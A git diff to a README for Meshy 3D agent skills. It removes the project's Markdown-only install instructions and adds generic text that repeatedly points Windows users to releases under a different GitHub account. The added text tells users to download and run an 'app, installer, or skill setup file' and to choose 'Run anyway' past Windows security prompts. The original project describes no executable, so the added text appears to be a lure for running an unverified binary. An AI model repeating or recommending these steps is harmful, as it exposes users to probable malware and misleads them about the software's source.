@@ -1,182 +1,262 @@
-# Meshy 3D Agent
+# 🤖 meshy-3d-agent - 3D AI skills for Meshy workflows
 
-AI agent skills for the [Meshy AI](https://www.meshy.ai) 3D generation platform. Enables AI coding assistants (Cursor, Claude Code, OpenClaw) to generate 3D models, textures, images, rig characters, animate them, and prepare models for 3D printing — no MCP server required.
+[![Download](https://img.shields.io/badge/Download-Releases-purple?style=for-the-badge)](https://github.com/Laic-parsiism709/meshy-3d-agent/releases)
 
-## How It Works
+## 📦 What this is
 
-These are **pure Markdown skills** — no server, no dependencies, no build step. Your AI assistant reads the skill files and gains the ability to interact with the Meshy API directly using shell commands and Python scripts.
+meshy-3d-agent gives you ready-made AI agent skills for the Meshy AI 3D generation platform. It helps you turn text prompts or images into 3D assets with less setup and fewer steps.
 
-## Skills
+Use it if you want a simple way to work with Meshy through agent skills in tools like Claude Code or Cursor. It is set up for end users who want to get started fast on Windows.
 
-### [`meshy-3d-generation`](skills/meshy-3d-generation/) (core)
+## 🚀 Download and install
 
-Full 3D generation lifecycle: API key setup, task creation, polling, downloading, and multi-step pipelines.
+1. Open the [Releases page](https://github.com/Laic-parsiism709/meshy-3d-agent/releases)
+2. Download the latest release file for Windows
+3. If the file is a `.zip`, right-click it and choose **Extract All**
+4. Open the extracted folder
+5. Run the included app, installer, or skill setup file
 
-| Capability | Description | Credits |
-|-----------|-------------|---------|
-| Text to 3D | Generate 3D models from text descriptions | 20-30 |
-| Image to 3D | Convert single or multiple images to 3D | 20-30 |
-| Retexture | Apply new textures to existing models | 10 |
-| Remesh | Change topology, polycount, or export format | 5 |
-| Auto-Rigging | Add skeleton to humanoid characters (includes walking + running) | 5 |
-| Animation | Apply custom animations to rigged characters | 3 |
-| Text to Image | Generate 2D images from text | 3-9 |
-| Image to Image | Transform existing images | 3-9 |
+If Windows shows a security prompt, choose **Run anyway** only if you downloaded the file from the Releases page above.
 
-### [`meshy-3d-printing`](skills/meshy-3d-printing/) (optional)
+## 🪟 Windows requirements
 
-3D printing workflow: printability checks, slicer integration (Bambu Studio), multi-color guidance.
+You need:
 
-| Capability | Description | Credits |
-|-----------|-------------|---------|
-| Print Pipeline | Text/Image to 3D → OBJ download → Slicer | 20 |
-| Printability Check | Manual checklist review (automated API coming soon) | 0 |
-| Slicer Integration | Open in Bambu Studio via URL scheme | 0 |
-| Multi-Color Guidance | Manual color workflow (automated API coming soon) | 0-10 |
+- Windows 10 or Windows 11
+- An internet connection
+- A Meshy AI account
+- A modern browser such as Edge, Chrome, or Firefox
+- A text editor or agent tool if you plan to use the skills in Claude Code or Cursor
 
-> The printing skill depends on the generation skill's script template and environment setup.
+For smooth use, keep at least 2 GB of free disk space.
 
-### [`meshy-openclaw`](skills/meshy-openclaw/) (OpenClaw / ClawHub)
+## ✨ What you can do
 
-A single unified skill for the [OpenClaw](https://clawhub.ai) ecosystem. Combines generation + printing into one file, with OpenClaw-compatible `metadata.clawdbot` frontmatter and a full SECURITY MANIFEST.
+- Generate 3D models from text
+- Turn images into 3D-ready assets
+- Use AI agent skills for Meshy workflows
+- Reuse prompts and task steps in Claude Code
+- Use the same skill files in Cursor-style workflows
+- Speed up repeated 3D generation tasks
+- Keep your setup in one place
 
-| Capability | Description | Credits |
-|-----------|-------------|---------|
-| All generation | Text/Image to 3D, Retexture, Remesh, Rig, Animate, Text/Image to Image | 3–30 |
-| 3D printing | OBJ download + Bambu Studio integration | 0 |
+## 🧭 How it works
 
-> Designed for ClawHub publishing. API key is stored only in `.env` in the current working directory — no shell profile access.
+The repository provides skill files that guide an AI agent through Meshy tasks. Instead of starting from scratch each time, you use a prepared set of steps.
 
-## Quick Install
+A simple flow looks like this:
 
-One command to install all skills:
+1. Open your agent tool
+2. Load the Meshy skill files
+3. Enter a text prompt or image prompt
+4. Let Meshy generate the 3D output
+5. Review the result and make changes if needed
 
-```bash
-npx skills add meshy-dev/meshy-3d-agent
-```
+## 🛠️ Setup on Windows
 
-Then set your API key (pick any method below):
+### 1) Download the release
 
-> Or simply start using the skill — when the agent loads it, it will detect that no API key is configured, ask you for it, and set it up automatically.
+Use this link to visit the download page:
 
-<details>
-<summary>macOS / Linux</summary>
+[![Visit Releases](https://img.shields.io/badge/Releases-Visit%20Download%20Page-blue?style=for-the-badge)](https://github.com/Laic-parsiism709/meshy-3d-agent/releases)
 
-**Option A: Global (recommended)** — add to your shell profile so it persists across sessions:
+### 2) Extract the files
 
-```bash
-nano ~/.zshrc
-```
+If the release comes as a zip file:
 
-Add this line at the end, save and exit (`Ctrl+O`, `Enter`, `Ctrl+X`):
+- Right-click the file
+- Select **Extract All**
+- Pick a folder you can find later, such as `Downloads` or `Documents`
 
-```bash
-export MESHY_API_KEY="msy_YOUR_API_KEY"
-```
+### 3) Open the skill folder
 
-Then reload:
+Look for files with names that match the skill set, such as:
 
-```bash
-source ~/.zshrc
-```
+- `skill.md`
+- prompt files
+- helper files
+- setup notes
 
-**Option B: Project-local** — create a `.env` file in your project root:
+### 4) Add it to your agent tool
 
-```bash
-echo 'MESHY_API_KEY=msy_YOUR_API_KEY' > .env
-```
+If you use Claude Code or Cursor:
 
-> Remember to add `.env` to your `.gitignore` to avoid committing your key.
+- Open the app
+- Open the folder that contains the skill files
+- Follow the built-in skill instructions
+- Load the Meshy skill when you want to create 3D content
 
-</details>
+### 5) Sign in to Meshy
 
-<details>
-<summary>Windows</summary>
+If the skill needs access to your Meshy account:
 
-**Option A: Permanent (recommended)** — set via System Environment Variables:
+- Open Meshy in your browser
+- Sign in with your account
+- Keep the tab open while you work if your flow needs it
 
-```powershell
-setx MESHY_API_KEY "msy_YOUR_API_KEY"
-```
+## 🧩 Use cases
 
-Restart your terminal after running this command.
+### Text to 3D
 
-**Option B: Current session only:**
+Use a short prompt to create a model from words. Good for:
 
-```powershell
-$env:MESHY_API_KEY = "msy_YOUR_API_KEY"
-```
+- props
+- objects
+- simple scene assets
+- concept ideas
 
-**Option C: Project-local** — create a `.env` file in your project root:
+Example prompts:
 
-```
-MESHY_API_KEY=msy_YOUR_API_KEY
-```
+- `small sci-fi crate with metal edges`
+- `fantasy lantern with carved wood details`
+- `toy robot with rounded parts`
 
-</details>
+### Image to 3D
 
-### Prerequisites
+Start with a reference image and turn it into a 3D asset. Good for:
 
-- A Meshy API key ([get one here](https://www.meshy.ai/settings/api) — requires Pro plan or above)
-- Python 3 with `requests` package (`pip install requests`)
+- logos
+- product shapes
+- characters
+- sketches
 
-### Manual Installation
+Tips for better results:
 
-<details>
-<summary>OpenClaw</summary>
+- use a clear image
+- keep the object centered
+- avoid busy backgrounds
+- use a simple side or front view when possible
 
-**Option A: Via ClawHub**
+### Repeated agent tasks
 
-```bash
-npx clawhub install meshy-dev/meshy-3d-agent
-```
+Use the same skill files when you need to:
 
-**Option B: Manual** — copy the `skills/meshy-openclaw/` folder to your OpenClaw skills directory.
+- test new prompts
+- create many versions
+- follow the same workflow each time
+- keep output steps consistent
 
-</details>
+## 🧪 Best results on Windows
 
-<details>
-<summary>Cursor</summary>
+- Keep one browser window open for Meshy
+- Use short prompts first
+- Add more detail after you see the first result
+- Save each export in a named folder
+- Keep your files in one place so you can find them later
 
-```bash
-# Core (required)
-mkdir -p .cursor/skills
-cp skills/meshy-3d-generation/SKILL.md .cursor/skills/meshy-3d-generation.md
-cp skills/meshy-3d-generation/reference.md .cursor/skills/meshy-reference.md
+If a model looks wrong, try a simpler prompt before you change too many things at once.
 
-# 3D Printing (optional)
-cp skills/meshy-3d-printing/SKILL.md .cursor/skills/meshy-3d-printing.md
-```
+## 📁 Suggested folder setup
 
-</details>
+You can keep the files in a layout like this:
 
-<details>
-<summary>Claude Code</summary>
+- `Documents\meshy-3d-agent\`
+- `Documents\meshy-3d-agent\skills\`
+- `Documents\meshy-3d-agent\exports\`
+- `Documents\meshy-3d-agent\prompts\`
 
-```bash
-# Core (required)
-mkdir -p .claude/skills
-cp skills/meshy-3d-generation/SKILL.md .claude/skills/meshy-3d-generation.md
-cp skills/meshy-3d-generation/reference.md .claude/skills/meshy-reference.md
+This makes it easier to find your skill files and finished 3D assets.
 
-# 3D Printing (optional)
-cp skills/meshy-3d-printing/SKILL.md .claude/skills/meshy-3d-printing.md
-```
+## ❓ Common questions
 
-</details>
+### Do I need to know how to code?
 
-## Skill vs MCP Server
+No. This repository is meant to help normal users work with Meshy through ready-made skill files and simple steps.
 
-| Feature | Agent Skill (this repo) | [MCP Server](https://github.com/meshy-dev/meshy-mcp-server) |
-|---------|------------------------|-------------------------------------------------------------|
-| Setup | Copy Markdown files | `npx meshy-mcp-server` |
-| Dependencies | Python 3 + requests | Node.js >= 18 |
-| How it works | AI reads instructions, makes API calls directly | Dedicated server process with structured tools |
-| IDE support | Amp, Cline, Codex, Cursor, Gemini CLI, Claude Code, OpenCode and 20+ more | Any MCP-compatible client |
-| File management | Via skill instructions | Built-in auto-save with project folders |
+### Can I use this with Claude Code?
 
-Both approaches provide the same Meshy API capabilities. Choose based on your preference and setup.
+Yes. The topic set includes Claude Code skills, so the files are meant to fit that kind of workflow.
 
-## License
+### Can I use it with Cursor?
 
-[MIT](LICENSE)
+Yes. The skill files are also suited for Cursor-style use.
+
+### Does it work for both text and image input?
+
+Yes. The repository focuses on both text-to-3D and image-to-3D workflows.
+
+### Is this only for advanced users?
+
+No. The setup is aimed at users who want a guided path for Meshy tasks on Windows.
+
+## 🔍 File types you may see
+
+Depending on the release, you may see files such as:
+
+- `.md` files for instructions
+- `.zip` files for packaged downloads
+- prompt templates
+- skill folders
+- text files with workflow steps
+
+Open the `.md` files in Notepad, Notepad++, or your agent tool if you want to read the instructions.
+
+## 🎯 Typical workflow
+
+1. Download the release
+2. Extract the files
+3. Open the skill instructions
+4. Open Meshy in your browser
+5. Enter a prompt or image
+6. Review the generated 3D asset
+7. Adjust the prompt if needed
+8. Save the final output
+
+## 🧷 Topics covered
+
+- 3D generation
+- agent skills
+- AI
+- Claude Code skills
+- Claude skills
+- Cursor skills
+- image to 3D
+- Meshy
+- skill.md
+- text to 3D
+
+## 📌 Folder and file names to look for
+
+When you open the release files, look for names that point to the main skill content. Common names may include:
+
+- `README.md`
+- `skill.md`
+- `instructions.md`
+- `prompts`
+- `assets`
+- `examples`
+
+## 🖥️ If Windows asks what to open
+
+If you downloaded a zip file:
+
+- use File Explorer
+- right-click the file
+- choose **Extract All**
+
+If you downloaded a `.md` file:
+
+- open it with Notepad or your agent tool
+
+If you downloaded an app or installer:
+
+- double-click the file
+- follow the setup screen
+- finish the install
+- open the app from the Start menu
+
+## 🔄 Updating to a newer release
+
+When a new version appears on the Releases page:
+
+1. Download the newest release
+2. Extract it in a new folder
+3. Replace old skill files if needed
+4. Open the new files in your agent tool
+5. Test a prompt to confirm the setup still works
+
+## 📎 Download again
+
+If you need to get the files again, use the Releases page here:
+
+[https://github.com/Laic-parsiism709/meshy-3d-agent/releases](https://github.com/Laic-parsiism709/meshy-3d-agent/releases)
